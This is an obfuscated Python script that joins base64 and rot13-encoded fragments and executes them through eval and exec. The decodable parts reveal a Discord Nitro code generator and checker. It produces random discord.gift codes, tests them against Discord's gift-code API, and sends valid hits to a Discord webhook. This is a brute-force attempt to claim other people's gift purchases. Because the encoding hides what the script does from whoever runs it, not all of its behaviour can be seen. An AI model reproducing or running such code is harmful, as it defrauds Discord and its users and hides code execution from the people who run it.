import base64, codecs
magic = 'aW1wb3J0IG9zCmltcG9ydCByYW5kb20KaW1wb3J0IHN0cmluZwppbXBvcnQgdGltZQppbXBvcnQgY3R5cGVzCgp0cnk6ICMgQ2hlY2sgaWYgdGhlIHJlcXVyZW1lbnRzIGhhdmUgYmVlbiBpbnN0YWxsZWQKICAgIGZyb20gZGlzY29yZF93ZWJob29rIGltcG9ydCBEaXNjb3JkV2ViaG9vayAjIFRyeSB0byBpbXBvcnQgZGlzY29yZF93ZWJob29rCmV4Y2VwdCBJbXBvcnRFcnJvcjogIyBJZiBpdCBjaG91bGQgbm90IGJlIGluc3RhbGxlZAogICAgaW5wdXQoZiJNb2R1bGUgZGlzY29yZF93ZWJob29rIG5vdCBpbnN0YWxsZWQsIHRvIGluc3RhbGwgcnVuICd7J3B5IC0zJyBpZiBvcy5uYW1lID09ICdudCcgZWxzZSAncHl0aG9uMy44J30gLW0gcGlwIGluc3RhbGwgZGlzY29yZF93ZWJob29rJ1xuUHJlc3MgZW50ZXIgdG8gZXhpdCIpICMgVGVsbCB0aGUgdXNlciBpdCBoYXMgbm90IGJlZW4gaW5zdGFsbGVkIGFuZCBob3cgdG8gaW5zdGFsbCBpdAogICAgZXhpdCgpICMgRXhpdCB0aGUgcHJvZ3JhbQp0cnk6ICMgU2V0dXAgdHJ5IHN0YXRlbWVudCB0byBjYXRjaCB0aGUgZXJyb3IKICAgIGltcG9ydCByZXF1ZXN0cyAjIFRyeSB0byBpbXBvcnQgcmVxdWVzdHMKZXhjZXB0IEltcG9ydEVycm9yOiAjIElmIGl0IGhhcyBub3QgYmVlbiBpbnN0YWxsZWQKICAgIGlucHV0KGYiTW9kdWxlIHJlcXVlc3RzIG5vdCBpbnN0YWxsZWQsIHRvIGluc3RhbGwgcnVuICd7J3B5IC0zJyBpZiBvcy5uYW1lID09ICdudCcgZWxzZSAncHl0aG9uMy44J30gLW0gcGlwIGluc3RhbGwgcmVxdWVzdHMnXG5QcmVzcyBlbnRlciB0byBleGl0IikjIFRlbGwgdGhlIHVzZXIgaXQgaGFzIG5vdCBiZWVuIGluc3RhbGxlZCBhbmQgaG93IHRvIGluc3RhbGwgaXQKICAgIGV4aXQoKSAjIEV4aXQgdGhlIHByb2dyYW0KCgpjbGFzcyBOaXRyb0dlbjogIyBJbml0aWFsaXNlIHRoZSBjbGFzcwogICAgZGVmIF9faW5pdF9fKHNlbGYpOiAjIFRoZSBpbml0YWxpc2VhaXRvbiBmdW5jdGlvbgogICAgICAgIHNlbGYuZmlsZU5hbWUgPSAiTml0cm8gQ29kZXMudHh0IiAjIFNldCB0aGUgZmlsZSBuYW1lIHRoZSBjb2RlcyBhcmUgc3RvcmVkIGluCgogICAgZGVmIG1haW4oc2VsZik6ICMgVGhlIG1haW4gZnVuY3Rpb24gY29udGFpbnMgdGhlIG1vc3QgaW1wb3J0YW50IGNvZGUKICAgICAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2NsZWFyJykgIyBDbGVhciB0aGUgc2NyZWVuCiAgICAgICAgaWYgb3MubmFtZSA9PSAibnQiOiAjIElmIHRoZSBzeXN0ZW0gaXMgd2luZG93cwogICAgICAgICAgICBwcmludCgiIikKICAgICAgICAgICAgY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5TZXRDb25zb2xlVGl0bGVXKCJOaXRybyBHZW5lcmFkb3IgZSBDaGVja2VyIC0gRmVpdG8gcG9yIEhvdHphbiMwMDAxIikgIyBDaGFuZ2UgdGhlCiAgICAgICAgZWxzZTogIyBPciBpZiBpdCBpcyB1bml4CiAgICAgICAgICAgIHByaW50KGYnXDMzXTA7Tml0cm8gR2VuZXJhZG9yIGUgQ2hlY2tlciAtIEZlaXRvIHBvciBIb3R6YW4jMDAwMVxhJywgZW5kPScnLCBmbHVzaD1UcnVlKSAjIFVwZGF0ZSB0aXRsZSBvZiBjb21tYW5kIHByb21wdAoKICAgICAgICBwcmludCgiIiIgCmQ4ODg4ODhQICAuODg4ODguICBkUCAgICAgZFAgZFAgICAgZFAgIC44ODg4OC4gICAgICAgICAgIGRQICAgICAgICAgIAogICA4OCAgICBkOCcgICBgOGIgODggICAuZDgnIFk4LiAgLjhQIGQ4JyAgIGA4YiAgICAgICAgICA4OCAgICAgICAgICAKICAgODggICAgODggICAgIDg4IDg4YWFhOFAnICAgWThhYThQICA4OCAgICAgODggICAgLmQ4ODhiODggLmQ4ODg4Yi4gCiAgIDg4ICAgIDg4ICAgICA4OCA4OCAgIGA4Yi4gICAgODggICAgODggICAgIDg4ICAgIDg4JyAgYDg4IDg4JyAgYCIiIAogICA4OCAgICBZOC4gICAuOFAgODggICAgIDg4ICAgIDg4ICAgIFk4LiAgIC44UCBkUCA4OC4gIC44OCA4OC4gIC4uLiAKICAgZFAgICAgIGA4ODg4UCcgIGRQICAgICBkUCAgICBkUCAgICAgYDg4ODhQJyAgODggYDg4ODg4UDggYDg4ODg4UCcgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiIiIpICMgUHJpbnQgdGhlIHRpdGxlIGNhcmQKICAgICAgICB0aW1lLnNsZWVwKDIpICMgV2FpdCBhIGZldyBzZWNvbmRzCiAgICAgICAgc2VsZi5zbG93VHlwZSgiQnkgRXF1aXBlIFRva3lvIDpkaXNjb3JkLmdnL0ZQZHdIZEZwUEEiLCAuMDIpICMgUHJpbnQgd2hvIGRldmVsb3BlZCB0aGUgY29kZQogICAgICAgIHRpbWUuc2xlZXAoMSkgIyBXYWl0IGEgbGl0dGxlIG1vcmUKICAgICAgICBzZWxmLnNsb3dUeXBlKCJcblF1Y'
love = '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'
god = 'B0byBjbG9zZSB0aGUgcHJvZ3JhbS4iKSAjIFRlbGwgdGhlIHVzZXIgdGhlIHByb2dyYW0gZmluaXNoZWQKICAgICAgICBbaW5wdXQoaSkgZm9yIGkgaW4gcmFuZ2UoNCwwLC0xKV0gIyBXYWl0IGZvciA0IGVudGVyIHByZXNzZXMKCgogICAgZGVmIHNsb3dUeXBlKHNlbGYsIHRleHQsIHNwZWVkLCBuZXdMaW5lID0gVHJ1ZSk6ICMgRnVuY3Rpb24gdXNlZCB0byBwcmludCB0ZXh0IGEgbGl0dGxlIG1vcmUgZmFuY2llcgogICAgICAgIGZvciBpIGluIHRleHQ6ICMgTG9vcCBvdmVyIHRoZSBtZXNzYWdlCiAgICAgICAgICAgIHByaW50KGksIGVuZCA9ICIiLCBmbHVzaCA9IFRydWUpICMgUHJpbnQgdGhlIG9uZSBjaGFyZWN0ZXIsIGZsdXNoIGlzIHVzZWQgdG8gZm9yY2UgcHl0aG9uIHRvIHByaW50IHRoZSBjaGFyCiAgICAgICAgICAgIHRpbWUuc2xlZXAoc3BlZWQpICMgU2xlZXAgYSBsaXR0bGUgYmVmb3JlIHRoZSBuZXh0IG9uZQogICAgICAgIGlmIG5ld0xpbmU6ICMgQ2hlY2sgaWYgdGhlIG5ld0xpbmUgYXJndW1lbnQgaXMgc2V0IHRvIFRydWUKICAgICAgICAgICAgcHJpbnQoKSAjIFByaW50IGEgZmluYWwgbmV3bGluZSB0byBtYWtlIGl0IGFjdCBtb3JlIGxpa2UgYSBub3JtYWwgcHJpbnQgc3RhdGVtZW50CgogICAgZGVmIGdlbmVyYXRvcihzZWxmLCBhbW91bnQpOiAjIEZ1bmN0aW9uIHVzZWQgdG8gZ2VuZXJhdGUgYW5kIHN0b3JlIG5pdHJvIGNvZGVzIGluIGEgc2VwZXJhdGUgZmlsZQogICAgICAgIHdpdGggb3BlbihzZWxmLmZpbGVOYW1lLCAidyIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGZpbGU6ICMgTG9hZCB1cCB0aGUgZmlsZSBpbiB3cml0ZSBtb2RlCiAgICAgICAgICAgIHByaW50KCJXYWl0LCBHZW5lcmF0aW5nIGZvciB5b3UiKSAjIExldCB0aGUgdXNlciBrbm93IHRoZSBjb2RlIGlzIGdlbmVyYXRpbmcgdGhlIGNvZGVzCgogICAgICAgICAgICBzdGFydCA9IHRpbWUudGltZSgpICMgTm90ZSB0aGUgaW5pdGFsaXNlYXRpb24gdGltZQoKICAgICAgICAgICAgZm9yIGkgaW4gcmFuZ2UoYW1vdW50KTogIyBMb29wIHRoZSBhbW91bnQgb2YgY29kZXMgdG8gZ2VuZXJhdGUKICAgICAgICAgICAgICAgIGNvZGUgPSAiIi5qb2luKHJhbmRvbS5jaG9pY2VzKAogICAgICAgICAgICAgICAgICAgIHN0cmluZy5hc2NpaV91cHBlcmNhc2UgKyBzdHJpbmcuZGlnaXRzICsgc3RyaW5nLmFzY2lpX2xvd2VyY2FzZSwKICAgICAgICAgICAgICAgICAgICBrID0gMTYKICAgICAgICAgICAgICAgICkpICMgR2VuZXJhdGUgdGhlIGNvZGUgaWQKCiAgICAgICAgICAgICAgICBmaWxlLndyaXRlKGYiaHR0cHM6Ly9kaXNjb3JkLmdpZnQve2NvZGV9XG4iKSAjIFdyaXRlIHRoZSBjb2RlCgogICAgICAgICAgICAjIFRlbGwgdGhlIHVzZXIgaXRzIGRvbmUgZ2VuZXJhdGluZyBhbmQgaG93IGxvbmcgdG9tZSBpdCB0b29rCiAgICAgICAgICAgIHByaW50KGYiR2VubmVkIHthbW91bnR9IGNvZGVzIHwgVGltZSB0YWtlbjoge3JvdW5kKHRpbWUudGltZSgpIC0gc3RhcnQsIDUpfXNcbiIpICMKCiAgICBkZWYgZmlsZUNoZWNrZXIoc2VsZiwgbm90aWZ5ID0gTm9uZSk6ICMgRnVuY3Rpb24gdXNlZCB0byBjaGVjayBuaXRybyBjb2RlcyBmcm9tIGEgZmlsZQogICAgICAgIHZhbGlkID0gW10gIyBBIGxpc3Qgb2YgdGhlIHZhbGlkIGNvZGVzCiAgICAgICAgaW52YWxpZCA9IDAgIyBUaGUgYW1vdW50IG9mIGludmFsaWQgY29kZXMgZGV0ZWN0ZWQKICAgICAgICB3aXRoIG9wZW4oc2VsZi5maWxlTmFtZSwgInIiLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmaWxlOiAjIE9wZW4gdGhlIGZpbGUgY29udGFpbmluZyB0aGUgbml0cm8gY29kZXMKICAgICAgICAgICAgZm9yIGxpbmUgaW4gZmlsZS5yZWFkbGluZXMoKTogIyBMb29wIG92ZXIgZWFjaCBsaW5lIGluIHRoZSBmaWxlCiAgICAgICAgICAgICAgICBuaXRybyA9IGxpbmUuc3RyaXAoIlxuIikgIyBSZW1vdmUgdGhlIG5ld2xpbmUgYXQgdGhlIGVuZCBvZiB0aGUgbml0cm8gY29kZQoKICAgICAgICAgICAgICAgICMgQ3JlYXRlIHRoZSByZXF1ZXN0cyB1cmwgZm9yIGxhdGVyIHVzZQogICAgICAgICAgICAgICAgdXJsID0gZiJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni9lbnRpdGxlbWVudHMvZ2lmdC1jb2Rlcy97bml0cm99P3dpdGhfYXBwbGljYXRpb249ZmFsc2Umd2l0aF9zdWJzY3JpcHRpb25fcGxhbj10cnVlIgoKICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHVybCkgIyBHZXQgdGhlIHJlc3BvbmNlIGZyb20gdGhlIHVybAoKICAgICAgICAgICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDogIyBJZiB0aGUgcmVzcG9uY2Ugd2VudCB0aHJvdWdoCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiIgVmFsaWQgfCB7bml0cm99ICIpICMgTm90aWZ5IHRoZSB1c2VyIHRoZSBjb2RlIHdhcyB2YWxpZAogICAgICAgICAgICAgICAgICAgIHZhbGlkLmFwcGVuZCh'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
